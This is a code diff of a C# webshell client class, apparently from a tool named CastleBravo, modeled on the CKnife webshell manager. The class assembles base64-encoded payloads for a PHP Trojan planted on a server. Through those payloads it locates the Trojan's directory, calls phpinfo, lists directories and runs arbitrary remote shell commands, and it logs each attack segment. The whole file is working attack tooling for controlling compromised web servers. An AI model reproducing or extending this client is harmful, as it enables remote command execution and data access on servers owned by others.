@@ -1,25 +1,29 @@
 ﻿using C2.Core;
 using System;
+using System.Collections.Generic;
+using System.Linq;
 using System.Text;
+using System.Threading.Tasks;
 
 namespace C2.Business.CastleBravo.WebShellTool
 {
-    public class CKnifeClient : IClient
+    class CKnife16EXEClient : IClient
     {
         private readonly string prefix;
         private readonly StringBuilder sb;
         private readonly ClientSetting clientSetting;
 
-        public CKnifeClient(string password, string clientSetting)
+        public CKnife16EXEClient(string password, string clientSetting)
         {
             this.clientSetting = ClientSetting.LoadSetting(clientSetting);
-            this.prefix = password + "=" + this.clientSetting.PHP_MAKE + "&" + this.clientSetting.ACTION;
+            this.prefix = password + "=" + this.clientSetting.PHP_MAKE;
             this.sb = new StringBuilder();
         }
 
+
         public string FetchLog()
         {
-            string ret = sb.ToString(); sb.Clear(); return ret; 
+            string ret = sb.ToString(); sb.Clear(); return ret;
         }
 
         public string MidStrEx(string response)
@@ -40,11 +44,10 @@ namespace C2.Business.CastleBravo.WebShellTool
 
         public string PHPIndex()
         {
-            string payload = String.Format("{0}={1}", prefix, clientSetting.PHP_INDEX);
+            string payload = prefix.Replace("@PARAM",clientSetting.PHP_INDEX);
 
             sb.AppendLine("定位Trojan所在目录:")
               .AppendLine(payload)
-              .AppendLine(string.Format("引导段:{0}", prefix))
               .AppendLine(string.Format("攻击段:{0}", ST.SuperDecodeBase64(clientSetting.PHP_INDEX)))
               .AppendLine();
 
@@ -53,11 +56,10 @@ namespace C2.Business.CastleBravo.WebShellTool
 
         public string PHPInfo()
         {
-            string payload = String.Format("{0}={1}", prefix, clientSetting.PHP_INFO);
+            string payload = prefix.Replace("@PARAM", clientSetting.PHP_INFO);
 
             sb.AppendLine("phpinfo:")
               .AppendLine(payload)
-              .AppendLine(string.Format("引导段:{0}", prefix))
               .AppendLine(string.Format("攻击段:{0}", ST.SuperDecodeBase64(clientSetting.PHP_INFO)))
               .AppendLine();
 
@@ -66,17 +68,14 @@ namespace C2.Business.CastleBravo.WebShellTool
 
         public string PHPReadDict(string dict)
         {
-            string payload = String.Format("{0}={1}&{2}={3}",
-                prefix,
-                clientSetting.PHP_READDICT,
-                clientSetting.PARAM1,
-                ST.EncodeUrlBase64(dict));
+            string attack = ST.DecodeBase64(clientSetting.PHP_READDICT).Replace("@PARAM2", dict);
+            string payload = prefix.Replace("@PARAM", ST.EncodeBase64(attack));
+
 
             sb.AppendLine("遍历目录:")
               .AppendLine(payload)
-              .AppendLine(string.Format("引导段:{0}", prefix))
-              .AppendLine(string.Format("攻击段:{0}", ST.SuperDecodeBase64(clientSetting.PHP_READDICT)))
-              .AppendLine(string.Format("参数一:{0}", ST.SuperDecodeBase64(dict)))
+              .AppendLine(string.Format("攻击段:{0}", attack))
+              .AppendLine(string.Format("查询路径:{0}", ST.SuperDecodeBase64(dict)))
               .AppendLine();
 
             return payload;
@@ -84,20 +83,15 @@ namespace C2.Business.CastleBravo.WebShellTool
 
         public string PHPShell(string shellEnv, string command)
         {
-            string payload = String.Format("{0}={1}&{2}={3}&{4}={5}",
-                prefix,
-                clientSetting.PHP_SHELL,
-                clientSetting.PARAM1,
-                ST.EncodeUrlBase64(shellEnv),
-                clientSetting.PARAM2,
-                ST.EncodeUrlBase64(command));
+
+            string attack = ST.DecodeBase64(clientSetting.PHP_SHELL).Replace("@PARAM1", shellEnv).Replace("@PARAM2", command);
+            string payload = prefix.Replace("@PARAM", ST.EncodeBase64(attack));
 
             sb.AppendLine("Remote Command:" + command)
               .AppendLine(payload)
-              .AppendLine(string.Format("引导段:{0}", prefix))
-              .AppendLine(string.Format("攻击段:{0}", ST.SuperDecodeBase64(clientSetting.PHP_SHELL)))
-              .AppendLine(string.Format("参数一:{0}", ST.SuperDecodeBase64(shellEnv)))
-              .AppendLine(string.Format("参数二:{0}", ST.SuperDecodeBase64(command)))
+              .AppendLine(string.Format("攻击段:{0}", attack))
+              .AppendLine(string.Format("执行路径:{0}", ST.SuperDecodeBase64(shellEnv)))
+              .AppendLine(string.Format("命令:{0}", ST.SuperDecodeBase64(command)))
               .AppendLine();
 
             return payload;
